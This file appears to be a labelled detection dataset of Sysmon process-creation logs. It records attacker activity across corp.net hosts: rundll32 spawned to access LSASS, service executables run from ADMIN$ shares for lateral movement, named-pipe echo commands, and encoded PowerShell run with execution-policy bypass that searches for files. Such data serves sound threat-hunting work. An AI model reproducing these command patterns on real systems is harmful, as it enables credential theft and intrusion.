datetime,subject,raw,pid,ppid,process_name,parent_process_name,cmdline,user,report_desc,mitre_tactic
2022-08-05 22:16:29+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:16:29.841973300Z""/>
    <EventRecordID>140154</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1428"" ThreadID=""1916""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-10.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:16:29.826</Data>
    <Data Name=""ProcessGuid"">{140A6FA9-96BD-62ED-0000-0010C5E8C401}</Data>
    <Data Name=""ProcessId"">596</Data>
    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
    <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Java\jre7\bin\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=DD81D91FF3B0763C392422865C9AC12E,IMPHASH=F8F47A970BADB255F8249475E7FBEABB</Data>
    <Data Name=""ParentProcessGuid"">{140A6FA9-92E6-62ED-0000-0010DA999E01}</Data>
    <Data Name=""ParentProcessId"">1604</Data>
    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
  </EventData>
</Event>
",596,1604,C:\Windows\System32\rundll32.exe,C:\Windows\SysWOW64\rundll32.exe,C:\Windows\sysnative\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to access LSASS,Credential Access
2022-08-05 22:16:30+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:16:30.453749600Z""/>
    <EventRecordID>140158</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1428"" ThreadID=""1916""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-10.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:16:30.453</Data>
    <Data Name=""ProcessGuid"">{140A6FA9-96BE-62ED-0000-001091EEC401}</Data>
    <Data Name=""ProcessId"">3408</Data>
    <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
    <Data Name=""FileVersion"">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
    <Data Name=""Description"">Windows Command Processor</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">C:\Windows\system32\cmd.exe /c echo e3140eabda6 &gt; \\.\pipe\d99345</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{140A6FA9-96BE-62ED-0000-00203AEEC401}</Data>
    <Data Name=""LogonId"">0x0000000001c4ee3a</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A</Data>
    <Data Name=""ParentProcessGuid"">{140A6FA9-96BD-62ED-0000-0010C5E8C401}</Data>
    <Data Name=""ParentProcessId"">596</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
  </EventData>
</Event>
",3408,596,C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,C:\Windows\system32\cmd.exe /c echo e3140eabda6 &gt; \\.\pipe\d99345,NT AUTHORITY\SYSTEM,,
2022-08-05 22:17:30+00:00,ACC-01,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:17:30.025100400Z""/>
    <EventRecordID>210329</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1440"" ThreadID=""1992""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-01.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:17:30.025</Data>
    <Data Name=""ProcessGuid"">{62886613-96FA-62ED-0000-0010B136C901}</Data>
    <Data Name=""ProcessId"">2508</Data>
    <Data Name=""Image"">\\ACC-01\ADMIN$\b8a3848.exe</Data>
    <Data Name=""FileVersion"">?</Data>
    <Data Name=""Description"">?</Data>
    <Data Name=""Product"">?</Data>
    <Data Name=""Company"">?</Data>
    <Data Name=""CommandLine"">\\ACC-01\ADMIN$\b8a3848.exe</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{62886613-6435-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=48452DD856C05E2942D9311A4917BEA6,IMPHASH=DE77F3139EAF74F1B255AB7BE0B6605F</Data>
    <Data Name=""ParentProcessGuid"">{62886613-6434-62ED-0000-001048930000}</Data>
    <Data Name=""ParentProcessId"">476</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
  </EventData>
</Event>
",2508,476,\\ACC-01\ADMIN$\b8a3848.exe,C:\Windows\System32\services.exe,\\ACC-01\ADMIN$\b8a3848.exe,NT AUTHORITY\SYSTEM,,
2022-08-05 22:17:31+00:00,ACC-01,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:17:31.089885600Z""/>
    <EventRecordID>210344</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1440"" ThreadID=""1992""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-01.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:17:31.089</Data>
    <Data Name=""ProcessGuid"">{62886613-96FB-62ED-0000-0010653BC901}</Data>
    <Data Name=""ProcessId"">1572</Data>
    <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{62886613-6435-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=51138BEEA3E2C21EC44D0932C71762A8,IMPHASH=EF8A44FE2F9AD4AB85E55004AAA024A9</Data>
    <Data Name=""ParentProcessGuid"">{62886613-96FA-62ED-0000-0010B136C901}</Data>
    <Data Name=""ParentProcessId"">2508</Data>
    <Data Name=""ParentImage"">\\ACC-01\ADMIN$\b8a3848.exe</Data>
    <Data Name=""ParentCommandLine"">\\ACC-01\ADMIN$\b8a3848.exe</Data>
  </EventData>
</Event>
",1572,2508,C:\Windows\SysWOW64\rundll32.exe,\\ACC-01\ADMIN$\b8a3848.exe,C:\Windows\System32\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to move laterally,Lateral Movement
2022-08-05 22:19:37+00:00,ACC-01,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:19:37.726947900Z""/>
    <EventRecordID>210971</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1440"" ThreadID=""1992""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-01.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:19:37.725</Data>
    <Data Name=""ProcessGuid"">{62886613-9779-62ED-0000-00106846CE01}</Data>
    <Data Name=""ProcessId"">5884</Data>
    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{62886613-6435-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=DD81D91FF3B0763C392422865C9AC12E,IMPHASH=F8F47A970BADB255F8249475E7FBEABB</Data>
    <Data Name=""ParentProcessGuid"">{62886613-96FB-62ED-0000-0010653BC901}</Data>
    <Data Name=""ParentProcessId"">1572</Data>
    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
  </EventData>
</Event>
",5884,1572,C:\Windows\System32\rundll32.exe,C:\Windows\SysWOW64\rundll32.exe,C:\Windows\sysnative\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to access LSASS,Credential Access
2022-08-05 22:19:38+00:00,ACC-01,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:19:38.478878100Z""/>
    <EventRecordID>210975</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1440"" ThreadID=""1992""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-01.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:19:38.463</Data>
    <Data Name=""ProcessGuid"">{62886613-977A-62ED-0000-0010F34ECE01}</Data>
    <Data Name=""ProcessId"">1284</Data>
    <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
    <Data Name=""FileVersion"">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
    <Data Name=""Description"">Windows Command Processor</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">C:\Windows\system32\cmd.exe /c echo 86420bf6b30 &gt; \\.\pipe\55bbda</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{62886613-977A-62ED-0000-00209C4ECE01}</Data>
    <Data Name=""LogonId"">0x0000000001ce4e9c</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A</Data>
    <Data Name=""ParentProcessGuid"">{62886613-9779-62ED-0000-00106846CE01}</Data>
    <Data Name=""ParentProcessId"">5884</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
  </EventData>
</Event>
",1284,5884,C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,C:\Windows\system32\cmd.exe /c echo 86420bf6b30 &gt; \\.\pipe\55bbda,NT AUTHORITY\SYSTEM,,
2022-08-05 22:20:25+00:00,ACC-01,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:20:25.567522800Z""/>
    <EventRecordID>211098</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1440"" ThreadID=""1992""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-01.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:20:25.536</Data>
    <Data Name=""ProcessGuid"">{62886613-97A9-62ED-0000-00101974CF01}</Data>
    <Data Name=""ProcessId"">212</Data>
    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
    <Data Name=""Description"">Windows PowerShell</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{62886613-977A-62ED-0000-00209C4ECE01}</Data>
    <Data Name=""LogonId"">0x0000000001ce4e9c</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
    <Data Name=""ParentProcessGuid"">{62886613-96FB-62ED-0000-0010653BC901}</Data>
    <Data Name=""ParentProcessId"">1572</Data>
    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
  </EventData>
</Event>
",212,1572,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=,NT AUTHORITY\SYSTEM,,
2022-08-05 22:21:32+00:00,ACC-01,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:21:32.588691200Z""/>
    <EventRecordID>211333</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1440"" ThreadID=""1992""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-01.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:21:32.588</Data>
    <Data Name=""ProcessGuid"">{62886613-97EC-62ED-0000-00102D6AD701}</Data>
    <Data Name=""ProcessId"">1808</Data>
    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
    <Data Name=""Description"">Windows PowerShell</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{62886613-977A-62ED-0000-00209C4ECE01}</Data>
    <Data Name=""LogonId"">0x0000000001ce4e9c</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
    <Data Name=""ParentProcessGuid"">{62886613-96FB-62ED-0000-0010653BC901}</Data>
    <Data Name=""ParentProcessId"">1572</Data>
    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
  </EventData>
</Event>
",1808,1572,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=,NT AUTHORITY\SYSTEM,,
2022-08-05 22:22:17+00:00,ACC-07,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:22:17.726613900Z""/>
    <EventRecordID>175831</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1444"" ThreadID=""1932""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-07.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:22:17.711</Data>
    <Data Name=""ProcessGuid"">{7A60D74F-9819-62ED-0000-00106853B001}</Data>
    <Data Name=""ProcessId"">1488</Data>
    <Data Name=""Image"">\\ACC-07\ADMIN$\4e6964b.exe</Data>
    <Data Name=""FileVersion"">?</Data>
    <Data Name=""Description"">?</Data>
    <Data Name=""Product"">?</Data>
    <Data Name=""Company"">?</Data>
    <Data Name=""CommandLine"">\\ACC-07\ADMIN$\4e6964b.exe</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{7A60D74F-64C4-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=C0C68E432CB9416B326DE705B4E582EC,IMPHASH=DE77F3139EAF74F1B255AB7BE0B6605F</Data>
    <Data Name=""ParentProcessGuid"">{7A60D74F-64C3-62ED-0000-001004940000}</Data>
    <Data Name=""ParentProcessId"">464</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
  </EventData>
</Event>
",1488,464,\\ACC-07\ADMIN$\4e6964b.exe,C:\Windows\System32\services.exe,\\ACC-07\ADMIN$\4e6964b.exe,NT AUTHORITY\SYSTEM,,
